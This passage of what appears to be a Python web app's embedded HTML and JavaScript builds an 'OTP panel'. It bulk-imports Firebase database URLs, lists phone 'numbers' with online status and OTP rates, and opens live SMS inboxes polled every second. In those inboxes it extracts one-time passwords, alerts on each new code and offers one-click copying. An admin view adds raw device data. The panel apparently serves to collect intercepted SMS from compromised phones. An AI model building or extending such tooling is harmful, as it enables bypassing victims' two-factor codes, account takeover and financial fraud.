.inbox-status{display:flex;align-items:center;gap:6px;font-size:12px;color:#16a34a;font-weight:600;margin-top:2px}
.inbox-status .dot{width:8px;height:8px;border-radius:50%;background:#16a34a}
.inbox-status.offline{color:#dc2626}
.inbox-status.offline .dot{background:#dc2626}
.inbox-meta{font-size:11px;color:#94a3b8;display:flex;justify-content:space-between;align-items:center}
.refresh-icon{cursor:pointer;font-size:20px;color:#94a3b8;padding:6px;min-width:36px;min-height:36px;display:flex;align-items:center;justify-content:center}
.refresh-icon:active{transform:scale(.9)}
.refresh-icon.spinning{animation:spin 1s linear infinite}
.top-number-badge{background:linear-gradient(135deg,#fef3c7,#fde68a);border:2px solid #fbbf24;border-radius:12px;padding:12px 14px;margin-bottom:12px;display:flex;align-items:center;gap:10px;font-size:13px;font-weight:700;color:#92400e;box-shadow:0 2px 8px rgba(251,191,36,.2)}
.top-number-badge .tn-icon{font-size:22px;flex-shrink:0}
.top-number-badge .tn-info{flex:1;min-width:0}
.top-number-badge .tn-num{font-size:16px;font-weight:800;color:#78350f;letter-spacing:.5px;word-break:break-all}
.top-number-badge .tn-count{font-size:11px;color:#92400e;font-weight:600;margin-top:2px;opacity:.8}
.top-number-badge .tn-highlight{background:#fbbf24;color:#78350f;padding:2px 8px;border-radius:8px;font-weight:800;font-size:11px}
.sms-list{background:#fff;border-radius:14px;overflow:hidden;box-shadow:0 2px 8px rgba(99,102,241,.06)}
.sms-item{padding:16px;border-bottom:1px solid #f1f5f9;position:relative}
.sms-item:last-child{border-bottom:none}
.sms-item.fresh{background:linear-gradient(90deg,#f0fdf4,#fff 60%);border-left:4px solid #16a34a}
.sms-item.otp-item{background:linear-gradient(90deg,#faf5ff,#fff 60%);border-left:4px solid #a855f7}
.sms-item .msg-type-badge{position:absolute;top:10px;right:10px;font-size:9px;font-weight:800;padding:2px 6px;border-radius:6px}
.sms-item .msg-type-badge.otp{background:#a855f7;color:#fff}
.sms-item .msg-type-badge.number{background:#16a34a;color:#fff}
.sms-head{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:8px;gap:8px;flex-wrap:wrap}
.sender{font-size:12px;font-weight:800;color:#ef4444;display:flex;align-items:center;flex-wrap:wrap}
.new-badge{background:linear-gradient(135deg,#dc2626,#ef4444);color:#fff;font-size:9px;font-weight:800;padding:2px 6px;border-radius:10px;margin-left:6px}
.sms-time{font-size:11px;color:#94a3b8;white-space:nowrap}
.sms-time.fresh{color:#16a34a;font-weight:700}
.time-ago{font-size:10px;color:#94a3b8;font-weight:600;margin-top:2px;text-align:right}
.time-ago.fresh{color:#16a34a}
.sms-body{font-size:14px;color:#334155;line-height:1.55;word-break:break-word;white-space:pre-wrap}
.sms-body .phone-highlight{background:#fef3c7;color:#92400e;padding:1px 5px;border-radius:4px;font-weight:700;border:1px dashed #fbbf24}
.otp-highlight{background:linear-gradient(135deg,#dcfce7,#bbf7d0);color:#166534;padding:2px 6px;border-radius:5px;font-weight:700;border:1px dashed #86efac}
.otp-copy-btn{display:inline-flex;align-items:center;gap:6px;margin-top:10px;padding:10px 16px;background:linear-gradient(135deg,#059669,#10b981);color:#fff;border:none;border-radius:20px;font-weight:700;font-size:12px;min-height:40px}
.otp-copy-btn:active{transform:scale(.96)}
.empty{text-align:center;padding:50px 20px;color:#94a3b8;font-size:14px;background:#fff;border-radius:14px}
.loading-text{text-align:center;padding:20px;color:#94a3b8;font-size:13px;background:#fff;border-radius:12px;margin-bottom:14px}
.spinner{display:inline-block;width:16px;height:16px;border:2px solid #e2e8f0;border-top-color:#10b981;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:8px}
.live-badge{display:inline-flex;align-items:center;gap:4px;background:#dcfce7;color:#166534;font-size:10px;font-weight:700;padding:3px 8px;border-radius:20px;margin-left:6px}
.live-badge .dot{width:6px;height:6px;border-radius:50%;background:#16a34a;animation:pulse 1.2s infinite}
.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(100px);background:#166534;color:#fff;padding:14px 24px;border-radius:12px;font-weight:600;font-size:14px;z-index:9999;transition:transform .3s;pointer-events:none;max-width:90vw;text-align:center}
.toast.show{transform:translateX(-50%) translateY(0)}
.hidden{display:none !important}
@media(min-width:600px){.stats{grid-template-columns:repeat(4,1fr)}}</style></head><body>

<div class="topbar">
<div class="brand"><span class="alex">Personal</span> <span class="panel">OTP</span></div>
<div class="top-actions">
<button class="refresh-btn" id="refresh-btn" onclick="manualRefresh()" title="Refresh">🔄</button>
<div class="conn loading" id="conn-badge"><span class="dot"></span><span id="conn-text">...</span></div>
</div>
<div class="nav"><a href="/" class="nav-link purple">📱 Numbers</a><a href="/otp" class="nav-link active">🔐 Personal OTP</a></div>
</div>

<div class="container">
<div id="list-view">

<div class="fb-add-card">
<h3>➕ Add Your Firebase URL</h3>
<div class="fb-add-row">
<input id="fb-url" placeholder="https://xxx-default-rtdb.firebaseio.com" onkeypress="if(event.key==='Enter')addFirebase()" type="url" autocomplete="off">
<button class="primary" id="add-btn" onclick="addFirebase()">Add</button>
<button class="gray" id="bulk-toggle" onclick="toggleBulk()">Bulk</button>
</div>
<div id="bulk-area" class="bulk-area">
<textarea id="fb-bulk" placeholder="Ek line me ek URL paste karo"></textarea>
<button onclick="bulkAdd()">📥 Import All</button>
</div>
<div id="add-msg" class="fb-msg"></div>
<div class="my-fb-list" id="my-fb-list"></div>
</div>

<div class="stats">
<div class="stat total" id="stat-total"><div class="label">TOTAL</div><div class="value" id="s-total">0</div></div>
<div class="stat online" id="stat-online"><div class="label">ONLINE</div><div class="value" id="s-online">0</div></div>
<div class="stat offline" id="stat-offline"><div class="label">OFFLINE</div><div class="value" id="s-offline">0</div></div>
<div class="stat otp" id="stat-otp"><div class="label">OTP RATE</div><div class="value" id="s-otp">0%</div></div>
</div>
<div class="quick"><div class="info">📱 Numbers : <b id="q-dev">0</b></div></div>
<div class="filter-live">
<button class="filter-live-btn online" id="btn-online" onclick="setLocalFilter('online')">🟢 Online <span class="count-badge" id="badge-online">0</span></button>
<button class="filter-live-btn offline" id="btn-offline" onclick="setLocalFilter('offline')">🔴 Offline <span class="count-badge" id="badge-offline">0</span></button>
</div>
<div id="loading-text" class="loading-text"><span class="spinner"></span><span id="loading-msg">Add a firebase to start...</span></div>
<div id="list-content" class="hidden">
<div class="search-box"><input id="search-num" placeholder="🔎 Search number / device" oninput="renderNumbers()"></div>
<div class="list-header"><h2 id="list-title">📱 All Numbers <span class="live-badge" id="live-badge" style="display:none"><span class="dot"></span>LIVE</span></h2><span class="count" id="num-count">0</span></div>
<div id="num-list"></div>
</div>
</div>

<div id="inbox-view" class="hidden">
<div class="inbox-header">
<div class="inbox-top"><a href="#" class="back-btn" onclick="event.preventDefault();backToList()">←</a><div style="flex:1"><div class="inbox-num" id="inbox-num">+91 ------</div><div class="inbox-status" id="inbox-status"><span class="dot"></span><span id="inbox-status-text">Online</span></div></div></div>
<div class="inbox-meta"><span>⚡ LIVE · auto 1s · Latest 60 SMS</span><span class="refresh-icon" onclick="loadInbox(true)">🔄</span></div>
</div>
<div id="top-number-badge" class="top-number-badge hidden">
<div class="tn-icon">🏆</div>
<div class="tn-info">
<div class="tn-num" id="tn-num">-</div>
<div class="tn-count">Sabse zyada baar aaya SMS me <span class="tn-highlight" id="tn-count-badge">0 bar</span></div>
</div>
</div>
<div id="sms-container"></div>
</div>
</div>

<div id="toast" class="toast"></div>

<script>
const COOKIE_NAME = "alex_personal_firebases_v2";
let myFirebases = [];
let allNumbers = [];
let numbers = [];
let currentNum = null;
let refreshTimer = null;
let lastSig = '';
let lastInboxSig = '';
let allInboxMsgs = [];
let localFilter = 'all';
let lastOtpSeen = '';
let notifPermissionAsked = false;

function getCookie(name){
  const cookies = document.cookie.split(';');
  for(let c of cookies){
    c = c.trim();
    if(c.indexOf(name + '=') === 0){
      try{ return JSON.parse(decodeURIComponent(c.substring(name.length + 1))); }
      catch(e){ return []; }
    }
  }
  return [];
}
function setCookie(name, value, days){
  const expires = new Date(Date.now() + days * 864e5).toUTCString();
  document.cookie = name + '=' + encodeURIComponent(JSON.stringify(value)) + '; expires=' + expires + '; path=/; SameSite=Lax';
}
function saveMyFirebases(){ setCookie(COOKIE_NAME, myFirebases, 365); }

function toast(text){
  const t = document.getElementById('toast');
  t.textContent = text;
  t.classList.add('show');
  setTimeout(()=>t.classList.remove('show'), 2500);
}

function playOtpSound(){
  try{
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    [880, 1100, 880].forEach((freq, i) => {
      const osc = ctx.createOscillator(); const gain = ctx.createGain();
      osc.connect(gain); gain.connect(ctx.destination); osc.frequency.value = freq;
      const t = ctx.currentTime + i * 0.2;
      gain.gain.setValueAtTime(0.2, t); gain.gain.exponentialRampToValueAtTime(0.001, t + 0.18);
      osc.start(t); osc.stop(t + 0.18);
    });
  }catch(e){}
}
function askNotificationPermission(){
  if(notifPermissionAsked) return;
  notifPermissionAsked = true;
  if('Notification' in window && Notification.permission === 'default'){ Notification.requestPermission(); }
}
function showOtpNotification(otp, from, message){
  toast('🔔 OTP: ' + otp + ' — ' + from);
  playOtpSound();
  if('Notification' in window && Notification.permission === 'granted'){
    try{ const n = new Notification('🔔 OTP: ' + otp, { body: from + '\n' + message.slice(0, 100), tag: 'otp-' + otp }); setTimeout(()=>n.close(), 10000); }catch(e){}
  }
  if(navigator.vibrate){ try{ navigator.vibrate([200, 100, 200, 100, 200]); }catch(e){} }
}

async function checkConn(){
  try{
    const r = await fetch('/api/conn'); const d = await r.json();
    const badge = document.getElementById('conn-badge'); const txt = document.getElementById('conn-text');
    if(d.mongo_connected){ badge.className = 'conn online'; txt.textContent = 'Live'; }
    else { badge.className = 'conn offline'; txt.textContent = 'Off'; }
  }catch(e){}
}

async function manualRefresh(){
  const btn = document.getElementById('refresh-btn');
  btn.classList.add('spinning');
  toast('🔄 Refreshing...');
  if(myFirebases.length > 0){ await loadNumbers(); }
  setTimeout(()=>btn.classList.remove('spinning'), 1200);
}

function renderMyFirebases(){
  const box = document.getElementById('my-fb-list');
  if(myFirebases.length === 0){ box.innerHTML = ''; return; }
  box.innerHTML = myFirebases.map((fb, i) => `
    <div class="my-fb-card">
      <div class="fb-icon">🔥</div>
      <div class="fb-info">
        <div class="fb-label">Firebase #${i+1}</div>
        <div class="fb-hash">ID: ${escapeHtml(fb.hash || 'hidden')}</div>
      </div>
      <div class="fb-actions"><button onclick="removeFirebase(${i})">🗑 Remove</button></div>
    </div>
  `).join('');
}

function toggleBulk(){
  const a = document.getElementById('bulk-area');
  a.style.display = (a.style.display === 'block') ? 'none' : 'block';
}

async function addFirebase(){
  const input = document.getElementById('fb-url');
  let url = input.value.trim();
  if(!url){ showMsg('add-msg','❌ URL required','err'); return; }
  if(!url.startsWith('http')) url = 'https://' + url;
  url = url.replace(/\/+$/, '');
  if(!url.includes('firebase')){ showMsg('add-msg','❌ Invalid firebase URL','err'); return; }
  if(myFirebases.some(f => f.url === url)){ showMsg('add-msg','⚠️ Already added','err'); return; }

  document.getElementById('add-btn').disabled = true;
  showMsg('add-msg','⏳ Adding...','ok');

  try{
    const r = await fetch('/api/otp/add', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({url: url})
    });
    const d = await r.json();
    if(d.success){
      myFirebases.push({url: url, hash: d.hash || 'hidden', label: 'Firebase #' + (myFirebases.length+1)});
      saveMyFirebases();
      input.value = '';
      showMsg('add-msg','✅ Added (URL hidden for security)','ok');
      renderMyFirebases();
      loadNumbers();
    } else {
      showMsg('add-msg','❌ ' + (d.error || 'Error'), 'err');
    }
  }catch(e){
    showMsg('add-msg','❌ Network error','err');
  }
  document.getElementById('add-btn').disabled = false;
}

async function bulkAdd(){
  const txt = document.getElementById('fb-bulk').value.trim();
  if(!txt){ showMsg('add-msg','❌ Empty','err'); return; }

  const urls = txt.split('\n').map(l=>l.trim()).filter(l=>l.startsWith('http') || l.includes('firebase'));
  if(!urls.length){ showMsg('add-msg','❌ No valid URLs','err'); return; }

  showMsg('add-msg', `⏳ Adding ${urls.length}...`, 'ok');
  let added = 0, skipped = 0, failed = 0;

  for(let i=0; i<urls.length; i++){
    let url = urls[i].trim();
    if(!url.startsWith('http')) url = 'https://' + url;
    url = url.replace(/\/+$/, '');
    if(!url.includes('firebase')){ failed++; continue; }
    if(myFirebases.some(f => f.url === url)){ skipped++; continue; }

    try{
      const r = await fetch('/api/otp/add', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({url: url})
      });
      const d = await r.json();
      if(d.success){
        myFirebases.push({url: url, hash: d.hash || 'hidden', label: 'Firebase #' + (myFirebases.length+1)});
        added++;
      } else { failed++; }
    }catch(e){ failed++; }

    showMsg('add-msg', `⏳ ${i+1}/${urls.length}`, 'ok');
  }

  saveMyFirebases();
  renderMyFirebases();
  document.getElementById('fb-bulk').value = '';
  document.getElementById('bulk-area').style.display = 'none';
  showMsg('add-msg', `✅ Added: ${added} · Skip: ${skipped} · Fail: ${failed}`, 'ok');
  loadNumbers();
}

function showMsg(id, text, type){
  const el = document.getElementById(id);
  el.className = 'fb-msg ' + type;
  el.textContent = text;
  if(type === 'ok') setTimeout(()=>{ if(el.textContent.includes('✅')) el.className = 'fb-msg'; }, 4000);
}

function removeFirebase(idx){
  if(!confirm('Remove this firebase from YOUR browser?')) return;
  myFirebases.splice(idx, 1);
  saveMyFirebases();
  renderMyFirebases();
  if(myFirebases.length === 0){
    allNumbers = []; numbers = [];
    document.getElementById('list-content').classList.add('hidden');
    document.getElementById('loading-text').classList.remove('hidden');
    document.getElementById('loading-msg').textContent = 'Add a firebase to start...';
  } else {
    loadNumbers();
  }
  toast('✅ Removed');
}

function setLocalFilter(f){
  if(localFilter === f){ localFilter = 'all'; }
  else { localFilter = f; }
  updateFilterButtons();
  applyLocalFilter();
  renderNumbers();
}

function updateFilterButtons(){
  document.getElementById('btn-online').classList.toggle('active-filter', localFilter === 'online');
  document.getElementById('btn-offline').classList.toggle('active-filter', localFilter === 'offline');
  let titleText = '📱 All Numbers';
  if(localFilter === 'online') titleText = '🟢 Online';
  else if(localFilter === 'offline') titleText = '🔴 Offline';
  document.getElementById('list-title').innerHTML = titleText + ' <span class="live-badge" id="live-badge" style="display:none"><span class="dot"></span>LIVE</span>';
}

function applyLocalFilter(){
  if(localFilter === 'online') numbers = allNumbers.filter(n => n.online === true);
  else if(localFilter === 'offline') numbers = allNumbers.filter(n => n.online !== true);
  else numbers = allNumbers.slice();
  document.getElementById('num-count').textContent = numbers.length;
}

async function loadNumbers(){
  if(myFirebases.length === 0){
    document.getElementById('list-content').classList.add('hidden');
    document.getElementById('loading-text').classList.remove('hidden');
    document.getElementById('loading-msg').textContent = 'Add a firebase to start...';
    return;
  }
  document.getElementById('loading-text').classList.remove('hidden');
  document.getElementById('loading-msg').innerHTML = '<span class="spinner"></span>Loading...';

  try{
    const r = await fetch('/api/otp/data', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({urls: myFirebases.map(f => f.url)})
    });
    const d = await r.json();
    if(!d.success){
      document.getElementById('loading-msg').textContent = '❌ ' + (d.error || 'Error');
      return;
    }
    allNumbers = d.numbers || [];
    document.getElementById('s-total').textContent = d.total || 0;
    document.getElementById('s-online').textContent = d.online || 0;
    document.getElementById('s-offline').textContent = d.offline || 0;
    document.getElementById('s-otp').textContent = (d.otp_rate || 0) + '%';
    document.getElementById('q-dev').textContent = allNumbers.length;
    document.getElementById('badge-online').textContent = d.online || 0;
    document.getElementById('badge-offline').textContent = d.offline || 0;

    applyLocalFilter();
    document.getElementById('loading-text').classList.add('hidden');
    document.getElementById('list-content').classList.remove('hidden');
    const sig = allNumbers.length + '|' + (d.online || 0) + '|' + localFilter;
    if(sig !== lastSig){ lastSig = sig; renderNumbers(); }
  }catch(e){
    document.getElementById('loading-msg').textContent = '❌ Network error';
  }
}

// ✅ PERSONAL OTP: Raw Data button NAHI
function renderNumbers(){
  const q = (document.getElementById('search-num').value || '').toLowerCase();
  const box = document.getElementById('num-list');
  const filtered = numbers.filter(n => !q ||
    (n.number||'').toLowerCase().includes(q) ||
    (n.device_name||'').toLowerCase().includes(q));
  if(filtered.length === 0){
    box.innerHTML = '<div class="empty">📭 No numbers found</div>';
    return;
  }
  box.innerHTML = filtered.map(n => {
    const isOnline = n.online === true;
    const isUnknown = (n.number || '').startsWith('UNKNOWN-');
    const iconCls = isUnknown ? 'gray' : (isOnline ? '' : 'red');
    const badgeCls = isOnline ? 'badge-online' : 'badge-offline';
    const badgeTxt = isOnline ? 'Online' : 'Offline';
    const titleCls = isUnknown ? 'unknown' : '';
    return `
      <div class="num-card">
        <div class="num-icon ${iconCls}" onclick="openInboxGlobal(${numbers.indexOf(n)})">${isUnknown ? '❓' : '📶'}</div>
        <div class="num-info" onclick="openInboxGlobal(${numbers.indexOf(n)})">
          <div class="num-title ${titleCls}">${escapeHtml(n.number)}</div>
          <div class="num-sub">
            <span class="pill">📨 ${n.msg_count} SMS</span>
            ${n.otp_count > 0 ? `<span class="pill otp">🔑 ${n.otp_count} OTP</span>` : ''}
          </div>
        </div>
        <div class="${badgeCls}" onclick="openInboxGlobal(${numbers.indexOf(n)})"><span class="dot"></span>${badgeTxt}</div>
      </div>
    `;
  }).join('');
}

function openInboxGlobal(idx){ if(idx < 0 || idx >= numbers.length) return; openInbox(numbers[idx]); }

async function openInbox(n){
  currentNum = n; lastInboxSig = ''; allInboxMsgs = []; lastOtpSeen = '';
  askNotificationPermission();
  document.getElementById('list-view').classList.add('hidden');
  document.getElementById('inbox-view').classList.remove('hidden');
  const inboxNumEl = document.getElementById('inbox-num');
  inboxNumEl.textContent = n.number;
  if((n.number || '').startsWith('UNKNOWN-')){ inboxNumEl.className = 'inbox-num unknown'; }
  else { inboxNumEl.className = 'inbox-num'; }
  const statusEl = document.getElementById('inbox-status'); const statusTxt = document.getElementById('inbox-status-text');
  if(n.online === true){ statusEl.className = 'inbox-status'; statusTxt.textContent = 'Online'; }
  else { statusEl.className = 'inbox-status offline'; statusTxt.textContent = 'Offline'; }
  document.getElementById('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> Loading...</div>';
  await loadInbox(false);
  if(refreshTimer) clearInterval(refreshTimer);
  refreshTimer = setInterval(()=>loadInbox(false), 1000);
}

function findTopNumber(msgs){
  const counter = {};
  const senderNums = new Set();
  msgs.forEach(m => {
    const from = m.from || '';
    const found = from.match(/(?<!\d)([6-9]\d{9})(?!\d)/g) || [];
    found.forEach(n => senderNums.add(n));
  });
  msgs.forEach(m => {
    const text = m.message || '';
    const found = text.match(/(?<!\d)([6-9]\d{9})(?!\d)/g) || [];
    found.forEach(n => {
      if(senderNums.has(n)) return;
      if(n.startsWith('1800') || n.startsWith('1900') || n.startsWith('1991')) return;
      counter[n] = (counter[n] || 0) + 1;
    });
  });
  let topNum = null, topCount = 0;
  for(const [num, cnt] of Object.entries(counter)){
    if(cnt > topCount){ topNum = num; topCount = cnt; }
  }
  return topNum ? {number: topNum, count: topCount} : null;
}

function updateTopNumberBadge(msgs){
  const badge = document.getElementById('top-number-badge');
  const top = findTopNumber(msgs);
  if(top && top.count >= 2){
    document.getElementById('tn-num').textContent = '📞 ' + top.number;
    document.getElementById('tn-count-badge').textContent = top.count + ' bar';
    badge.classList.remove('hidden');
  } else {
    badge.classList.add('hidden');
  }
}

async function loadInbox(showLoader){
  if(!currentNum) return;
  if(showLoader){ document.getElementById('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> Refreshing...</div>'; }
  const controller = new AbortController(); const timeoutId = setTimeout(() => controller.abort(), 15000);
  try{
    const r = await fetch('/api/inbox?fb=' + encodeURIComponent(currentNum.firebase) + '&id=' + encodeURIComponent(currentNum.device_id) + '&num=' + encodeURIComponent(currentNum.number), { signal: controller.signal });
    clearTimeout(timeoutId); const d = await r.json();
    if(!d.success){ document.getElementById('sms-container').innerHTML = '<div class="empty">❌ ' + (d.error || 'Error') + '</div>'; return; }
    const msgs = d.messages || []; allInboxMsgs = msgs;
    if(msgs.length > 0){
      const newest = msgs[0];
      const newestOtp = newest.otp || extractOtp(newest.message);
      const sig = (newest.timestamp || 0) + '|' + newestOtp + '|' + (newest.message || '').slice(0,40);
      if(newestOtp && sig !== lastOtpSeen){ lastOtpSeen = sig; showOtpNotification(newestOtp, newest.from || 'Unknown', newest.message || ''); }
    }
    const sig = msgs.map(m => (m.timestamp||0) + '|' + (m.message||'').slice(0,40)).join('#');
    if(sig !== lastInboxSig){ lastInboxSig = sig; renderMessages(); }
  }catch(e){ clearTimeout(timeoutId); }
}

function timeAgo(ts, now){
  if(!ts) return '';
  const diff = now - ts;
  if(diff < 10) return 'अभी';
  if(diff < 60) return `${diff}s पहले`;
  if(diff < 3600) return `${Math.floor(diff/60)}m पहले`;
  if(diff < 86400) return `${Math.floor(diff/3600)}h पहले`;
  return `${Math.floor(diff/86400)}d पहले`;
}

function highlightPhoneNumbers(text){
  return text.replace(/(?<!\d)([6-9]\d{9})(?!\d)/g, '<span class="phone-highlight">$1</span>');
}

function renderMessages(){
  const box = document.getElementById('sms-container');
  const now = Math.floor(Date.now() / 1000);
  let msgs = [...allInboxMsgs]
    .sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0))
    .slice(0, 60);
  
  updateTopNumberBadge(msgs);
  
  if(!msgs.length){ box.innerHTML = '<div class="empty">📭 No SMS</div>'; return; }
  box.innerHTML = '<div class="sms-list">' + msgs.map(m => {
    const otp = m.otp || extractOtp(m.message);
    let body;
    if(otp){
      body = escapeHtml(m.message).replace(otp, `<span class="otp-highlight">${otp}</span>`);
      body = highlightPhoneNumbers(body);
    } else {
      body = highlightPhoneNumbers(escapeHtml(m.message));
    }
    const copyBtn = otp ? `<button class="otp-copy-btn" onclick="copyOtp('${otp}')">📋 Copy OTP ${otp}</button>` : '';
    const ts = m.timestamp || 0; const isFresh = ts >= (now - 120);
    const cls = isFresh ? 'fresh' : (otp ? 'otp-item' : '');
    const timeStr = m.date_string ? m.date_string : fmtTime(ts); const ago = timeAgo(ts, now);
    const newBadge = isFresh ? '<span class="new-badge">NEW</span>' : '';
    const hasNumber = /[6-9]\d{9}/.test(m.message || '');
    let typeBadge = '';
    if(otp) typeBadge = '<span class="msg-type-badge otp">OTP</span>';
    else if(hasNumber) typeBadge = '<span class="msg-type-badge number">📞 NUM</span>';
    return `
      <div class="sms-item ${cls}">
        ${typeBadge}
        <div class="sms-head">
          <div class="sender">${escapeHtml(m.from || 'Unknown')} ${newBadge}</div>
          <div style="text-align:right">
            <div class="sms-time ${isFresh?'fresh':''}">${escapeHtml(timeStr)}</div>
            <div class="time-ago ${isFresh?'fresh':''}">${ago}</div>
          </div>
        </div>
        <div class="sms-body">${body}</div>
        ${copyBtn}
      </div>
    `;
  }).join('') + '</div>';
}

function backToList(){
  document.getElementById('inbox-view').classList.add('hidden');
  document.getElementById('list-view').classList.remove('hidden');
  if(refreshTimer){ clearInterval(refreshTimer); refreshTimer = null; }
  currentNum = null;
}

function extractOtp(text){
  if(!text) return '';
  const t = String(text);
  let m = t.match(/(?:otp|one[- ]time|password|code|pin|verification|passcode)[^\d]{0,30}(\d{4,8})/i);
  if(m) return m[1];
  m = t.match(/(\d{4,8})[^\d]{0,30}(?:is your|otp|one[- ]time|code)/i);
  if(m) return m[1];
  m = t.match(/#(\d{4,8})/);
  if(m) return m[1];
  return '';
}

function fmtTime(ts){
  if(!ts) return '';
  try{
    let t = parseInt(ts);
    if(t > 1e12) t = Math.floor(t/1000);
    if(t < 1e9) return String(ts);
    const d = new Date(t * 1000);
    const opts = { timeZone: 'Asia/Kolkata', hour12: true, day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit' };
    return d.toLocaleString('en-IN', opts).replace(',', ' |');
  }catch(e){ return String(ts); }
}

function copyOtp(code){
  const done = ()=>toast('✅ Copied: ' + code);
  if(navigator.clipboard){ navigator.clipboard.writeText(code).then(done).catch(()=>{ const ta = document.createElement('textarea'); ta.value = code; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove(); done(); }); }
}

function escapeHtml(s){ return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }

try{
  const raw = getCookie(COOKIE_NAME) || getCookie("alex_personal_firebases") || [];
  if(Array.isArray(raw)){
    myFirebases = raw.map(x => {
      if(typeof x === 'string') return {url: x, hash: 'hidden', label: 'Firebase'};
      return x;
    });
  }
}catch(e){ myFirebases = []; }

renderMyFirebases();
checkConn();
if(myFirebases.length > 0) loadNumbers();
setInterval(checkConn, 8000);
setInterval(()=>{ if(myFirebases.length > 0 && !currentNum) loadNumbers(); }, 10000);
</script>
</body>
</html>
"""


# ==================== ADMIN DASHBOARD ====================
# ✅ Admin version: Firebases count + Raw Data button
ADMIN_DASHBOARD_HTML = USER_DASHBOARD_HTML.replace(
    '<div class="nav"><a href="/" class="nav-link active">📱 Numbers</a><a href="/otp" class="nav-link otp">🔐 Personal OTP</a></div>',
    '<div class="nav"><a href="/admin/dashboard" class="nav-link active">📱 Numbers</a><a href="/firebases" class="nav-link">🔥 Firebases</a><a href="/admin/security" class="nav-link">🔒 Security</a></div>'
).replace(
    'Alex</span> <span class="panel">OTP PANEL',
    'Alex</span> <span class="panel">ADMIN</span><span style="font-size:10px;background:linear-gradient(135deg,#f59e0b,#ef4444);color:#fff;padding:3px 8px;border-radius:8px;margin-left:6px;font-weight:700;vertical-align:middle">👑</span>'
).replace(
    '<div class="quick"><div class="info">📱 Numbers : <b id="q-dev">0</b></div></div>',
    '''<div class="quick">
      <div class="info">🔥 Firebases : <b id="q-fb">0</b> &nbsp;·&nbsp; 📱 Numbers : <b id="q-dev">0</b></div>
      <a href="/firebases" style="padding:10px 16px;background:linear-gradient(135deg,#7c3aed,#a855f7);color:#fff;text-decoration:none;border-radius:10px;font-size:12px;font-weight:600;min-height:44px;display:inline-flex;align-items:center">⚙️ Manage</a>
    </div>'''
).replace(
    # ✅ Admin me Raw Data button add karo
    '''        <div class="${badgeCls}" onclick="openInboxGlobal(${numbers.indexOf(n)})"><span class="dot"></span>${badgeTxt}</div>
      </div>
    `;
  }).join('');
}

function openInboxGlobal(idx){
  if(idx < 0 || idx >= numbers.length) return;
  openInbox(numbers[idx]);
}''',
    '''        <div class="card-actions">
          <button class="raw-btn" onclick="event.stopPropagation();openRawData(${numbers.indexOf(n)})" title="Raw Data">🔍</button>
        </div>
        <div class="${badgeCls}" onclick="openInboxGlobal(${numbers.indexOf(n)})"><span class="dot"></span>${badgeTxt}</div>
      </div>
    `;
  }).join('');
}

function openRawData(idx){
  if(idx < 0 || idx >= numbers.length) return;
  const n = numbers[idx];
  const url = '/debug?fb=' + encodeURIComponent(n.firebase) + '&id=' + encodeURIComponent(n.device_id);
  window.open(url, '_blank');
}

function openInboxGlobal(idx){
  if(idx < 0 || idx >= numbers.length) return;
  openInbox(numbers[idx]);
}'''
).replace(
    # ✅ Admin: loadNumbers me firebase count update
    '''    document.getElementById('q-dev').textContent = allNumbers.length;''',
    '''    document.getElementById('q-dev').textContent = allNumbers.length;
    if(document.getElementById('q-fb')) document.getElementById('q-fb').textContent = d.firebases_total || 0;'''
).replace(
    # ✅ Admin ke liye raw-btn CSS add karo
    '''.arrow{color:#cbd5e1;font-size:20px}''',
    '''.arrow{color:#cbd5e1;font-size:20px}
.card-actions{display:flex;gap:6px;flex-shrink:0}
.raw-btn{padding:8px 10px;background:linear-gradient(135deg,#f59e0b,#f97316);color:#fff;border:none;border-radius:8px;font-size:11px;font-weight:700;cursor:pointer;min-height:36px;display:inline-flex;align-items:center;gap:4px}
.raw-btn:active{transform:scale(.94)}'''
)


# ==================== SECURITY HTML ====================
SECURITY_HTML = r"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>Security — Alex Admin</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<meta name="theme-color" content="#f59e0b">
<style>""" + MOBILE_CSS + r"""
body{background:#f7f8fc;color:#1e293b;min-height:100vh;padding:0 0 40px}
.topbar{background:#fff;padding:10px 14px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;box-shadow:0 1px 3px rgba(0,0,0,.05);flex-wrap:wrap;gap:8px;padding-top:calc(10px + env(safe-area-inset-top))}
.brand{font-size:17px;font-weight:800;letter-spacing:-.5px}
.brand .alex{background:linear-gradient(90deg,#7c3aed,#ec4899);-webkit-background-clip:text;background-clip:text;color:transparent}
.brand .admin-badge{font-size:10px;background:linear-gradient(135deg,#f59e0b,#ef4444);color:#fff;padding:3px 8px;border-radius:8px;margin-left:6px;font-weight:700}
.nav{display:flex;gap:6px;align-items:center;flex-wrap:wrap;order:3;width:100%;justify-content:space-between}
@media(min-width:640px){.nav{order:0;width:auto}}
.nav-link{padding:10px 14px;border-radius:10px;text-decoration:none;font-size:12px;font-weight:600;color:#475569;background:#f1f5f9;white-space:nowrap;min-height:42px;display:inline-flex;align-items:center}
.nav-link.active{background:linear-gradient(135deg,#7c3aed,#a855f7);color:#fff}
.nav-link.security{background:#fef3c7;color:#92400e}
.nav-link.security.active{background:linear-gradient(135deg,#f59e0b,#ef4444);color:#fff}
.logout-btn{background:#f1f5f9;color:#ef4444;border:none;padding:10px 12px;border-radius:10px;font-size:12px;font-weight:600;text-decoration:none;min-height:42px;display:inline-flex;align-items:center}
.container{max-width:600px;margin:0 auto;padding:14px}
.card{background:#fff;border-radius:14px;padding:20px;margin-bottom:14px;box-shadow:0 2px 8px rgba(99,102,241,.06)}
